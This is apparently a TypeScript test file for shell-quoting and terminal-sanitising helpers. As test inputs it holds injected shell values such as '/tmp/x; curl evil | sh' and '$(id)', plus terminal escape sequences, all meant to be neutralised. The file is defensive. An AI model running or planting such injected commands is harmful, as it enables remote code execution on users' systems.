import { expect, test } from "bun:test";
import { hasControl, printable, shellQuote } from "./ui.ts";

test("shellQuote leaves plain words alone and quotes the rest", () => {
  expect(shellQuote("/Users/me/src/my.repo")).toBe("/Users/me/src/my.repo");
  expect(shellQuote("/Users/me/My Repo")).toBe("'/Users/me/My Repo'");
  expect(shellQuote("/tmp/x; curl evil | sh")).toBe("'/tmp/x; curl evil | sh'");
  expect(shellQuote("/tmp/it's")).toBe(`'/tmp/it'\\''s'`);
  expect(shellQuote("$(id)")).toBe("'$(id)'");
});

test("printable takes out what would drive a terminal", () => {
  expect(printable("claude\u001b]52;c;eA==\u0007-2")).toBe("claude]52;c;eA==-2");
  expect(printable("codex\u009b2J")).toBe("codex2J");
  expect(printable("café ✓")).toBe("café ✓");
  expect(hasControl("a\tb")).toBe(true);
  expect(hasControl("plain/path-1")).toBe(false);
});
